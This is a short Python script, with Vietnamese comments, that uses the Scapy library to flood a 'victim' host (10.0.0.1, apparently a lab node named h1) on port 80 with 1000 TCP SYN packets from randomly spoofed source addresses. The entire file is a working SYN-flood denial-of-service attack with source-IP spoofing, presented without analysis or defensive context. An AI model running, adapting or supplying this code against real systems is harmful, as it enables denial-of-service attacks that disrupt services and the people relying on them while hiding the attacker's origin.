from scapy.all import *
from scapy.all import IP, TCP, send
from random import randint

target_ip = "10.0.0.1"        # IP nạn nhân (h1)
target_port = 80              # Cổng dịch vụ cần tấn công (HTTP)

for i in range(1000):         # Gửi 1000 gói tin
    fake_ip = ".".join(map(str, [randint(1, 255) for _ in range(4)]))  # IP giả
    ip_layer = IP(src=fake_ip, dst=target_ip)
    tcp_layer = TCP(sport=RandShort(), dport=target_port, flags='S')  # SYN packet
    packet = ip_layer / tcp_layer
    send(packet, verbose=0)
